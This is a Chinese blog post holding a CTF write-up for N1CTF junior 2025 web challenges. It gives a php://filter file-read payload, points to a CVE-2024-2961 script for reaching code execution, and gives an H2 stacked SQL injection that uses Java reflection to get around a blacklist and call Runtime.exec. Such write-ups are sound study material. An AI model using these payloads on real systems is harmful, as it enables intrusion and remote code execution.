@@ -1,0 +1,213 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>N1CTF junior 2025 Web(复现) | L的博客</title><meta name="author" content="L"><meta name="copyright" content="L"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="说实话很久没水博客了，感觉自己自从大二以来对CTF的热情就越来越低，各种事情压过来，什么协会，攻防，社工，明明才大二，领导安排的任务一个比一个离谱，没有报酬还占用一堆时间，当然这些可能也是是我自己心里逃避的借口而已，但不知道为什么就是累，好了不能再这么下去了😠，开始学习。还有感谢bao师傅提供的附件Gavatar   upload.php很明显当上传的文件为空时会进入url的判断，将url指向的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="N1CTF junior 2025 Web(复现)">
+<meta property="og:url" content="https://lisien11.xyz/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="L的博客">
+<meta property="og:description" content="说实话很久没水博客了，感觉自己自从大二以来对CTF的热情就越来越低，各种事情压过来，什么协会，攻防，社工，明明才大二，领导安排的任务一个比一个离谱，没有报酬还占用一堆时间，当然这些可能也是是我自己心里逃避的借口而已，但不知道为什么就是累，好了不能再这么下去了😠，开始学习。还有感谢bao师傅提供的附件Gavatar   upload.php很明显当上传的文件为空时会进入url的判断，将url指向的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover88.jpg">
+<meta property="article:published_time" content="2025-02-22T10:56:55.000Z">
+<meta property="article:modified_time" content="2025-02-22T17:40:56.123Z">
+<meta property="article:author" content="L">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover88.jpg"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://lisien11.xyz/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'N1CTF junior 2025 Web(复现)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-23 01:40:56'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/LSE.css"><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/%E5%9B%BE%E7%89%87/1231.jpg" onerror="onerror=null;src='/img/lll.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">115</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">43</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover88.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="L的博客"><span class="site-name">L的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">N1CTF junior 2025 Web(复现)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-22T10:56:55.000Z" title="发表于 2025-02-22 18:56:55">2025-02-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-22T17:40:56.123Z" title="更新于 2025-02-23 01:40:56">2025-02-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">550</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>1分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title="N1CTF junior 2025 Web(复现)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="说实话很久没水博客了，感觉自己自从大二以来对CTF的热情就越来越低，各种事情压过来，什么协会，攻防，社工，明明才大二，领导安排的任务一个比一个离谱，没有报酬还占用一堆时间，当然这些可能也是是我自己心里逃避的借口而已，但不知道为什么就是累，好了不能再这么下去了😠，开始学习。还有感谢bao师傅提供的附件"><a href="#说实话很久没水博客了，感觉自己自从大二以来对CTF的热情就越来越低，各种事情压过来，什么协会，攻防，社工，明明才大二，领导安排的任务一个比一个离谱，没有报酬还占用一堆时间，当然这些可能也是是我自己心里逃避的借口而已，但不知道为什么就是累，好了不能再这么下去了😠，开始学习。还有感谢bao师傅提供的附件" class="headerlink" title="说实话很久没水博客了，感觉自己自从大二以来对CTF的热情就越来越低，各种事情压过来，什么协会，攻防，社工，明明才大二，领导安排的任务一个比一个离谱，没有报酬还占用一堆时间，当然这些可能也是是我自己心里逃避的借口而已，但不知道为什么就是累，好了不能再这么下去了😠，开始学习。还有感谢bao师傅提供的附件"></a>说实话很久没水博客了，感觉自己自从大二以来对CTF的热情就越来越低，各种事情压过来，什么协会，攻防，社工，明明才大二，领导安排的任务一个比一个离谱，没有报酬还占用一堆时间，当然这些可能也是是我自己心里逃避的借口而已，但不知道为什么就是累，好了不能再这么下去了😠，开始学习。还有感谢bao师傅提供的附件</h1><h1 id="Gavatar"><a href="#Gavatar" class="headerlink" title="Gavatar"></a>Gavatar</h1><img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250222-210758696.png" class="">  
+<p>upload.php很明显当上传的文件为空时会进入url的判断，将url指向的文件写入到<code>$avatarPath</code>而远程文件读取利用的函数是file_get_contents,那么我们就可以进行任意文件的读取然后写入到<code>$avatarPath</code>，而再读取头像的avatar.php下我们可以发现无需知道<code>$avatarPath</code>就可以读取到头像，虽然user[id]是随机数但是无影响<br><img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250222-211158313.png" class="">  </p>
+<p>但仅仅是文件读取的话我们是无法得到flag的，这里还需要使用到CVE-2024-2961<br>这里我利用珂字辈师傅拆解出的脚本来跑payload</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/kezibei/php-filter-iconv">https://github.com/kezibei/php-filter-iconv</a></p>
+<p>读取/proc/self/maps</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/proc/self/maps</span><br></pre></td></tr></table></figure>
+<img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250222-211759586.png" class="">  
+<img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250222-211830647.png" class="">  
+<p>然后根据maps来读取/usr/lib/x86_64-linux-gnu/libc.so.6<br><img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250222-230943020.png" class=""><br><img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250222-231444165.png" class="">  </p>
+<p>然后rce<br><img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250222-230957524.png" class=""><br><img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250222-231009546.png" class=""><br>注意不要进行url编码，因为系统不会自动解码</p>
+<img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250222-230927463.png" class="">  
+<h1 id="EasyDB"><a href="#EasyDB" class="headerlink" title="EasyDB"></a>EasyDB</h1><img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250223-013402784.png" class="">  
+<p>看web的路由会发现没有多少代码。<br><img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250223-013444475.png" class=""><br>看一下其登陆逻辑<br><img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250223-013534924.png" class=""><br>可以发现其直接将sql语句拼接然后继续check<br><img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250223-013609585.png" class=""><br>而check里只禁了命令执行的类和方法名。<br>那么这里就可以进行sql注入。但是我们需要rce才可以得到flag<br><img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250223-013823989.png" class=""><br>而这题使用的数据库为h2数据库。这个数据库可以使用堆叠注入利用CREATE来创建函数别名进而进行命令执行</p>
+<p>这里使用反射来绕过黑名单</p>
+<img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250223-014052615.png" class="">  
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;%3b+CREATE+ALIAS+AE+AS+$$+void+e(String+cmd)+throws+Exception&#123;Class+clazz+%3d+Class.forName(&quot;java.lang.R&quot;%2b&quot;untime&quot;)%3bObject+RT%3d+clazz.getMethod(&quot;getR&quot;%2b&quot;untime&quot;).invoke(null)%3bclazz.getMethod(&quot;exe&quot;%2b&quot;c&quot;,String.class).invoke(RT,cmd)%3b&#125;$$%3bCALL+AE(&#x27;</span>calc<span class="string">&#x27;)%3b--+&amp;password=123</span></span><br></pre></td></tr></table></figure>
+<img src="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/IMG_20250223-013102280.png" class="">  
+<h1 id="traefik"><a href="#traefik" class="headerlink" title="traefik"></a>traefik</h1><h1 id="display"><a href="#display" class="headerlink" title="display"></a>display</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lisien11.xyz">L</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lisien11.xyz/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/">https://lisien11.xyz/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://lisien11.xyz" target="_blank">L的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover88.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/02/09/VNCTF/" title="VNCTF2025wp(部分)"><img class="cover" src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover38.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">VNCTF2025wp(部分)</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/%E5%9B%BE%E7%89%87/1231.jpg" onerror="this.onerror=null;this.src='/img/lll.png'" alt="avatar"/></div><div class="author-info__name">L</div><div class="author-info__description">我只是一个平平无奇路过的普通大学生罢了</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">115</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">43</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lisien11"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lisien11" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2488218724@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">无人问津也好，技不如人也罢，你都要试着安静下来，去做自己该做的事，而不是让内心烦躁焦虑，毁掉你本就不多的热情和定力。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%B4%E5%AE%9E%E8%AF%9D%E5%BE%88%E4%B9%85%E6%B2%A1%E6%B0%B4%E5%8D%9A%E5%AE%A2%E4%BA%86%EF%BC%8C%E6%84%9F%E8%A7%89%E8%87%AA%E5%B7%B1%E8%87%AA%E4%BB%8E%E5%A4%A7%E4%BA%8C%E4%BB%A5%E6%9D%A5%E5%AF%B9CTF%E7%9A%84%E7%83%AD%E6%83%85%E5%B0%B1%E8%B6%8A%E6%9D%A5%E8%B6%8A%E4%BD%8E%EF%BC%8C%E5%90%84%E7%A7%8D%E4%BA%8B%E6%83%85%E5%8E%8B%E8%BF%87%E6%9D%A5%EF%BC%8C%E4%BB%80%E4%B9%88%E5%8D%8F%E4%BC%9A%EF%BC%8C%E6%94%BB%E9%98%B2%EF%BC%8C%E7%A4%BE%E5%B7%A5%EF%BC%8C%E6%98%8E%E6%98%8E%E6%89%8D%E5%A4%A7%E4%BA%8C%EF%BC%8C%E9%A2%86%E5%AF%BC%E5%AE%89%E6%8E%92%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%B8%80%E4%B8%AA%E6%AF%94%E4%B8%80%E4%B8%AA%E7%A6%BB%E8%B0%B1%EF%BC%8C%E6%B2%A1%E6%9C%89%E6%8A%A5%E9%85%AC%E8%BF%98%E5%8D%A0%E7%94%A8%E4%B8%80%E5%A0%86%E6%97%B6%E9%97%B4%EF%BC%8C%E5%BD%93%E7%84%B6%E8%BF%99%E4%BA%9B%E5%8F%AF%E8%83%BD%E4%B9%9F%E6%98%AF%E6%98%AF%E6%88%91%E8%87%AA%E5%B7%B1%E5%BF%83%E9%87%8C%E9%80%83%E9%81%BF%E7%9A%84%E5%80%9F%E5%8F%A3%E8%80%8C%E5%B7%B2%EF%BC%8C%E4%BD%86%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%E5%B0%B1%E6%98%AF%E7%B4%AF%EF%BC%8C%E5%A5%BD%E4%BA%86%E4%B8%8D%E8%83%BD%E5%86%8D%E8%BF%99%E4%B9%88%E4%B8%8B%E5%8E%BB%E4%BA%86%F0%9F%98%A0%EF%BC%8C%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E3%80%82%E8%BF%98%E6%9C%89%E6%84%9F%E8%B0%A2bao%E5%B8%88%E5%82%85%E6%8F%90%E4%BE%9B%E7%9A%84%E9%99%84%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">说实话很久没水博客了，感觉自己自从大二以来对CTF的热情就越来越低，各种事情压过来，什么协会，攻防，社工，明明才大二，领导安排的任务一个比一个离谱，没有报酬还占用一堆时间，当然这些可能也是是我自己心里逃避的借口而已，但不知道为什么就是累，好了不能再这么下去了😠，开始学习。还有感谢bao师傅提供的附件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gavatar"><span class="toc-number">2.</span> <span class="toc-text">Gavatar</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EasyDB"><span class="toc-number">3.</span> <span class="toc-text">EasyDB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#traefik"><span class="toc-number">4.</span> <span class="toc-text">traefik</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#display"><span class="toc-number">5.</span> <span class="toc-text">display</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/" title="N1CTF junior 2025 Web(复现)"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover88.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="N1CTF junior 2025 Web(复现)"/></a><div class="content"><a class="title" href="/2025/02/22/N1CTF-junior-2025-Web-%E5%A4%8D%E7%8E%B0/" title="N1CTF junior 2025 Web(复现)">N1CTF junior 2025 Web(复现)</a><time datetime="2025-02-22T10:56:55.000Z" title="发表于 2025-02-22 18:56:55">2025-02-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/09/VNCTF/" title="VNCTF2025wp(部分)"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover38.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VNCTF2025wp(部分)"/></a><div class="content"><a class="title" href="/2025/02/09/VNCTF/" title="VNCTF2025wp(部分)">VNCTF2025wp(部分)</a><time datetime="2025-02-09T04:17:21.000Z" title="发表于 2025-02-09 12:17:21">2025-02-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/03/hgame2025/" title="hgame2025"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover92.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hgame2025"/></a><div class="content"><a class="title" href="/2025/02/03/hgame2025/" title="hgame2025">hgame2025</a><time datetime="2025-02-03T14:23:05.000Z" title="发表于 2025-02-03 22:23:05">2025-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/27/%E5%87%BA%E9%A2%98/" title="出题"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="出题"/></a><div class="content"><a class="title" href="/2025/01/27/%E5%87%BA%E9%A2%98/" title="出题">出题</a><time datetime="2025-01-27T09:56:32.000Z" title="发表于 2025-01-27 17:56:32">2025-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" title="西湖论剑"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover13.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="西湖论剑"/></a><div class="content"><a class="title" href="/2025/01/18/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" title="西湖论剑">西湖论剑</a><time datetime="2025-01-18T08:26:34.000Z" title="发表于 2025-01-18 16:26:34">2025-01-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By L</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo.lse11.xyz',
+      region: 'ap-guangzhou',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(init,0)
+    else getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(init)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo.lse11.xyz',
+      region: 'ap-guangzhou',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+      
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script async data-pjax src="/js/LSE.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
